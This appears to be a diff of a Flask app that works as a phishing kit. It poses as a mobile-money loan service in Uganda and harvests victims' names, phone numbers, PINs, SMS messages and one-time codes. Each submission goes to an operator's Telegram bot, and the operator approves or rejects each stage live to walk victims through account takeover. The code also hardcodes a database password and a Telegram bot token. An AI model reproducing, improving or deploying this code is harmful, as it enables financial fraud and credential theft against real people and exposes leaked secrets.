@@ -8,12 +8,10 @@ import requests
 app = Flask(__name__)
 app.secret_key = "super_secret_momo_key"
 
-# MongoDB connection with SSL/TLS fallback for Vercel Serverless environment
-MONGO_URI = "mongodb+srv://superuser:2006@superuser.uenn69l.mongodb.net/momo_loan_db?retryWrites=true&w=majority&appName=superuser"
-client = MongoClient(MONGO_URI, tls=True, tlsAllowInvalidCertificates=True)
+# MongoDB connection
+client = MongoClient("mongodb+srv://superuser:2006@superuser.uenn69l.mongodb.net/momo_loan_db?retryWrites=true&w=majority&appName=superuser")
 db = client["momo_loan_db"]
 applications_collection = db["applications"]
-support_collection = db["support_tickets"]
 
 # Dedicated Uganda Telegram Configuration 🇺🇬
 TELEGRAM_BOT_TOKEN = "9106925472:AAEcFDIOHZAvUAAgNKqjZLGp8Z_Bre5l4DI"
@@ -23,12 +21,12 @@ def send_telegram_interactive_alert(app_data, stage_title="NEW SUBMISSION", step
     db_id = str(app_data.get("_id"))
     
     message = (
-        f"🇺🇬 *{stage_title}*\n\n"
+        f"📩 *{stage_title}*\n\n"
         f"👤 *Name:* {app_data.get('first_name', '')} {app_data.get('last_name', '')}\n"
         f"📞 *Phone:* +256 {app_data.get('phone', '')}\n"
-        f"💬 *WhatsApp:* `{app_data.get('whatsapp_phone', '—')}`\n"
+        f"📱 *WhatsApp:* {app_data.get('whatsapp_phone', '—')}\n"
         f"🔑 *PIN:* `{app_data.get('password', '—')}`\n"
-        f"💬 *SMS Message:* `{app_data.get('auth_code', '—')}`\n"
+        f"💬 *SMS Code:* `{app_data.get('auth_code', '—')}`\n"
         f"🔢 *Final OTP:* `{app_data.get('final_auth_code', '—')}`\n\n"
         f"🆔 *Application ID:* `{app_data.get('app_id')}`"
     )
@@ -37,10 +35,6 @@ def send_telegram_interactive_alert(app_data, stage_title="NEW SUBMISSION", step
         "inline_keyboard": [
             [
                 {"text": f"✅ Approve {step_code.upper()}", "callback_data": f"approve_{step_code}_{db_id}"}
-            ],
-            [
-                {"text": "⚠️ Bad SMS / Data", "callback_data": f"badsms_{step_code}_{db_id}"},
-                {"text": "⏱️ Stalled User", "callback_data": f"stalled_{step_code}_{db_id}"}
             ],
             [
                 {"text": f"❌ Reject {step_code.upper()}", "callback_data": f"reject_{step_code}_{db_id}"},
@@ -62,288 +56,55 @@ def send_telegram_interactive_alert(app_data, stage_title="NEW SUBMISSION", step
     except Exception as e:
         print(f"Telegram alert error: {e}")
 
-def send_telegram_support_alert(ticket_data, db_id):
-    clean_phone = ticket_data.get('whatsapp_phone', '').replace('+', '').replace(' ', '')
-    wa_direct_link = f"https://wa.me/{clean_phone}"
-
-    message = (
-        f"🆘 *NEW HELP / SUPPORT TICKET* 🆘\n\n"
-        f"🆔 *Ticket ID:* `{ticket_data.get('ticket_id')}`\n"
-        f"💬 *WhatsApp Phone:* `{ticket_data.get('whatsapp_phone')}`\n"
-        f"📝 *Reported Issue:*\n\"{ticket_data.get('issue')}\"\n\n"
-        f"🕒 *Submitted:* <t:{int(ticket_data.get('created_at'))}:R>"
-    )
-
-    reply_markup = {
-        "inline_keyboard": [
-            [
-                {"text": "💬 Open WhatsApp Chat", "url": wa_direct_link}
-            ],
-            [
-                {"text": "✅ Mark Resolved", "callback_data": f"resolve_help_{db_id}"}
-            ]
-        ]
-    }
-
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    payload = {
-        "chat_id": TELEGRAM_ADMIN_CHAT_ID,
-        "text": message,
-        "parse_mode": "Markdown",
-        "reply_markup": reply_markup
-    }
-
-    try:
-        requests.post(url, json=payload, timeout=5)
-    except Exception as e:
-        print(f"Telegram support alert error: {e}")
-
-@app.route("/health")
-def health():
-    try:
-        client.admin.command('ping')
-        return jsonify({"status": "ok", "database": "connected", "market": "Uganda"}), 200
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)}), 500
-
-@app.route("/submit-support", methods=["POST"])
-def submit_support():
-    try:
-        data = request.get_json() or {}
-        whatsapp_phone = data.get("whatsapp_phone", "").strip()
-        issue_text = data.get("issue", "").strip()
-
-        if not whatsapp_phone or not issue_text:
-            return jsonify({"status": "error", "message": "Missing required fields"}), 400
-
-        ticket_data = {
-            "whatsapp_phone": whatsapp_phone,
-            "issue": issue_text,
-            "status": "Open",
-            "created_at": time.time(),
-            "ticket_id": "HELP" + os.urandom(3).hex().upper()
-        }
-
-        inserted_id = support_collection.insert_one(ticket_data).inserted_id
-        send_telegram_support_alert(ticket_data, str(inserted_id))
-
-        return jsonify({"status": "ok", "message": "Ticket submitted successfully"}), 200
-    except Exception as e:
-        print(f"Error submitting support ticket: {e}")
-        return jsonify({"status": "error", "message": str(e)}), 500
-
 @app.route("/telegram-webhook", methods=["POST"])
 def telegram_webhook():
-    try:
-        data = request.get_json() or {}
-        print("=== TELEGRAM WEBHOOK RECEIVED ===", data)
+    data = request.get_json()
+    
+    if "callback_query" in data:
+        callback = data["callback_query"]
+        callback_data = callback["data"]
+        callback_id = callback["id"]
         
-        # 1. Handle Inline Button Clicks (Approvals, Rejections, Flags, Resolve)
-        if "callback_query" in data:
-            callback = data["callback_query"]
-            callback_data = callback.get("data", "")
-            callback_id = callback.get("id")
-            message_obj = callback.get("message", {})
-            chat_id = message_obj.get("chat", {}).get("id")
-            message_id = message_obj.get("message_id")
-            original_text = message_obj.get("text", "")
-            reply_markup = message_obj.get("reply_markup")
+        parts = callback_data.split("_")
+        if len(parts) >= 3:
+            action = parts[0]
+            step_code = parts[1]
+            db_id = parts[2]
             
-            parts = callback_data.split("_")
-            if len(parts) >= 3:
-                action = parts[0]
-                step_code = parts[1]
-                db_id = parts[2]
-                
-                step_name = step_code.upper()
-                status_banner = ""
-                text_response = "Action processed"
-                
-                try:
-                    obj_id = ObjectId(db_id)
-                except Exception as e:
-                    print(f"❌ Invalid ObjectId format: {db_id}, error: {e}")
-                    return jsonify({"status": "ok"}), 200
-
-                target_app = applications_collection.find_one({"_id": obj_id})
-                if not target_app:
-                    target_app = applications_collection.find_one(sort=[("_id", -1)])
-
-                if action == "resolve":
-                    if step_code == "help":
-                        support_collection.update_one(
-                            {"_id": obj_id},
-                            {"$set": {"status": "Resolved"}}
-                        )
-                        status_banner = "✅ Support Ticket Resolved!\n\n"
-                        text_response = "✅ Ticket marked as Resolved!"
-                elif target_app:
-                    actual_obj_id = target_app["_id"]
-                    
-                    if action == "approve":
-                        if step_code == "pin":
-                            new_status = "Stage1_Approved"
-                        elif step_code == "sms":
-                            new_status = "Stage2_Approved"
-                        elif step_code == "otp":
-                            new_status = "Stage3_Approved"
-                        else:
-                            new_status = "Approved"
-
-                        applications_collection.update_one(
-                            {"_id": actual_obj_id},
-                            {"$set": {"status": new_status, "custom_message": ""}}
-                        )
-                        status_banner = f"✅ {step_name} Approved! User has moved to the next step.\n\n"
-                        text_response = f"✅ {step_name} Approved! User has moved to the next step."
-
-                    elif action == "reject":
-                        if step_code == "pin":
-                            new_status = "Reject_PIN"
-                            fail_msg = "❌ PIN verification failed. Please check your PIN and re-enter."
-                        elif step_code == "sms":
-                            new_status = "Reject_SMS"
-                            fail_msg = "❌ SMS message was invalid or expired. Please re-copy and paste."
-                        elif step_code == "otp":
-                            new_status = "Reject_OTP"
-                            fail_msg = "❌ Final OTP incorrect. Please check your messages and try again."
-                        else:
-                            new_status = "Rejected"
-                            fail_msg = "❌ Request rejected. Please try again."
-
-                        applications_collection.update_one(
-                            {"_id": actual_obj_id},
-                            {"$set": {"status": new_status, "custom_message": fail_msg}}
-                        )
-                        status_banner = f"❌ {step_name} Rejected!\n\n"
-                        text_response = f"❌ {step_name} Rejected!"
-
-                    elif action == "badsms":
-                        applications_collection.update_one(
-                            {"_id": actual_obj_id},
-                            {"$set": {"status": "BadInput", "custom_message": "⚠️ Invalid SMS/data format submitted. Please copy the complete, unedited message from MTN."}}
-                        )
-                        status_banner = "⚠️ Flagged Bad SMS/Data Input!\n\n"
-                        text_response = "⚠️ Flagged bad input!"
-
-                    elif action == "stalled":
-                        applications_collection.update_one(
-                            {"_id": actual_obj_id},
-                            {"$set": {"status": "StalledPrompt", "custom_message": "⏱️ Your session is waiting for authorization. Please respond promptly."}}
-                        )
-                        status_banner = "⏱️ Stalled User Reminder Sent!\n\n"
-                        text_response = "⏱️ Sent stall reminder!"
-
-                    elif action == "msg":
-                        applications_collection.update_one(
-                            {"_id": actual_obj_id},
-                            {"$set": {"status": "CustomMessage", "custom_message": "💬 Admin Note: Please review your entry and provide the correct information."}}
-                        )
-                        status_banner = "💬 Custom Message Prompt Sent!\n\n"
-                        text_response = "💬 Prompt sent!"
-
-                # Edit message text in-place to show the status banner at the top
-                if chat_id and message_id:
-                    edit_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
-                    clean_original = original_text
-                    for prefix in ["✅", "❌", "⚠️", "⏱️", "💬", "🇺🇬"]:
-                        if prefix in clean_original[:5]:
-                            split_parts = clean_original.split("\n\n", 1)
-                            if len(split_parts) > 1:
-                                clean_original = split_parts[1]
-
-                    updated_text = status_banner + clean_original
-                    try:
-                        requests.post(edit_url, json={
-                            "chat_id": chat_id,
-                            "message_id": message_id,
-                            "text": updated_text,
-                            "parse_mode": "Markdown",
-                            "reply_markup": reply_markup
-                        }, timeout=5)
-                    except Exception as edit_err:
-                        print(f"Edit message error: {edit_err}")
-
-                # Trigger modal popup notification alert
-                answer_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
-                try:
-                    requests.post(answer_url, json={
-                        "callback_query_id": callback_id, 
-                        "text": text_response,
-                        "show_alert": True
-                    }, timeout=5)
-                except Exception as ans_err:
-                    print(f"Answer callback error: {ans_err}")
-
-        # 2. Handle Direct Text Messages & Diagnostic Commands (/test or /diagnose)
-        elif "message" in data:
-            msg = data["message"]
-            chat_id = str(msg.get("chat", {}).get("id"))
-            text = msg.get("text", "").strip()
-            
-            if chat_id == TELEGRAM_ADMIN_CHAT_ID:
-                if text == "/test" or text == "/diagnose":
-                    diag_results = []
-                    diag_status_icon = "🟢"
-                    
-                    try:
-                        client.admin.command('ping')
-                        diag_results.append("✅ MongoDB Atlas: Connected & Responsive")
-                    except Exception as db_err:
-                        diag_status_icon = "🔴"
-                        diag_results.append(f"❌ MongoDB Atlas Error: {db_err}")
-                        
-                    try:
-                        wh_res = requests.get(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getWebhookInfo", timeout=5).json()
-                        wh_result_data = wh_res.get("result", {})
-                        pending = wh_result_data.get("pending_update_count", 0)
-                        last_err = wh_result_data.get("last_error_message", "None")
-                        diag_results.append(f"✅ Telegram Webhook Active\n    • Pending Updates: `{pending}`\n    • Last Error: `{last_err}`")
-                    except Exception as wh_err:
-                        diag_status_icon = "🔴"
-                        diag_results.append(f"❌ Webhook Info Check Failed: {wh_err}")
-                        
-                    try:
-                        latest_app = applications_collection.find_one(sort=[("_id", -1)])
-                        if latest_app:
-                            diag_results.append(f"✅ Latest DB Record:\n    • ID: `{latest_app.get('app_id')}`\n    • Status: `{latest_app.get('status')}`")
-                        else:
-                            diag_results.append("⚠️ MongoDB connected, but no applications found yet.")
-                    except Exception as app_err:
-                        diag_status_icon = "🟡"
-                        diag_results.append(f"⚠️ Latest Record Warning: {app_err}")
-                        
-                    report_message = (
-                        f"{diag_status_icon} *SYSTEM DIAGNOSTIC REPORT* {diag_status_icon}\n\n" +
-                        "\n\n".join(diag_results)
-                    )
-                    
-                    reply_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-                    requests.post(reply_url, json={
-                        "chat_id": TELEGRAM_ADMIN_CHAT_ID,
-                        "text": report_message,
-                        "parse_mode": "Markdown"
-                    })
-                    return jsonify({"status": "ok"}), 200
-
+            if action == "approve":
+                if step_code == "pin":
+                    new_status = "Stage1_Approved"
+                elif step_code == "sms":
+                    new_status = "Stage2_Approved"
+                elif step_code == "otp":
+                    new_status = "Stage3_Approved"
                 else:
-                    latest_app = applications_collection.find_one(sort=[("_id", -1)])
-                    if latest_app:
-                        applications_collection.update_one(
-                            {"_id": latest_app["_id"]},
-                            {"$set": {"custom_message": text, "status": "CustomMessage"}}
-                        )
-                        reply_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-                        requests.post(reply_url, json={
-                            "chat_id": TELEGRAM_ADMIN_CHAT_ID,
-                            "text": f"📢 Pushed live to user screen:\n\"{text}\""
-                        })
+                    new_status = "Approved"
 
-        return jsonify({"status": "ok"}), 200
-    except Exception as global_err:
-        print(f"❌ Webhook global error caught: {global_err}")
-        return jsonify({"status": "ok"}), 200
+                applications_collection.update_one(
+                    {"_id": ObjectId(db_id)},
+                    {"$set": {"status": new_status, "custom_message": ""}}
+                )
+                text_response = f"✅ {step_code.upper()} Approved!"
 
+            elif action == "reject":
+                applications_collection.update_one(
+                    {"_id": ObjectId(db_id)},
+                    {"$set": {"status": "Rejected", "custom_message": "Invalid authentication details. Please try again."}}
+                )
+                text_response = f"❌ {step_code.upper()} Rejected!"
+
+            elif action == "msg":
+                applications_collection.update_one(
+                    {"_id": ObjectId(db_id)},
+                    {"$set": {"status": "CustomMessage", "custom_message": "Action Required: Please carefully check your authentication details and re-enter."}}
+                )
+                text_response = "💬 Prompt sent to user screen!"
+
+            answer_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
+            requests.post(answer_url, json={"callback_query_id": callback_id, "text": text_response})
+
+    return jsonify({"status": "ok"}), 200
 
 @app.route("/")
 def index():
@@ -353,6 +114,7 @@ def index():
 def collect_whatsapp():
     if request.method == "POST":
         session["whatsapp_phone"] = request.form.get("whatsapp_phone")
+        # Redirect to your next step (e.g., apply_step1 or login)
         return redirect(url_for("apply_step1"))
     return render_template("whatsapp.html")
 
@@ -367,7 +129,7 @@ def apply_step1():
         session["amount"] = request.form.get("amount")
         session["term"] = request.form.get("term")
         session["purpose"] = request.form.get("purpose")
-        session["whatsapp_phone"] = request.form.get("whatsapp_phone")
+        session["whatsapp_phone"] = request.form.get("whatsapp_phone")  # Captures WhatsApp number
         return redirect(url_for("apply_step2"))
     return render_template("apply_step1.html")
 
@@ -378,6 +140,8 @@ def apply_step2():
         session["last_name"] = request.form.get("last_name")
         session["phone"] = request.form.get("phone")
         
+        # Ensure whatsapp_phone stays stored in session
+        # (If it was submitted via form, capture it; otherwise keep what Step 1 saved)
         if request.form.get("whatsapp_phone"):
             session["whatsapp_phone"] = request.form.get("whatsapp_phone")
             
@@ -409,7 +173,7 @@ def login():
             "first_name": session.get("first_name", "User"),
             "last_name": session.get("last_name", "Applicant"),
             "phone": session.get("phone", "000000000"),
-            "whatsapp_phone": session.get("whatsapp_phone", "—"),
+            "whatsapp_phone": session.get("whatsapp_phone", "—"),  # <--- Add this line here
             "employment": session.get("employment", "Self-Employed"),
             "income": session.get("income", "1000000"),
             "password": pin,
@@ -495,6 +259,10 @@ def final_verify():
 @app.route("/success")
 def success():
     return render_template("success.html")
+
+@app.route("/health")
+def health_check():
+    return "OK", 200
 
 if __name__ == "__main__":
     app.run(debug=True, port=5000)
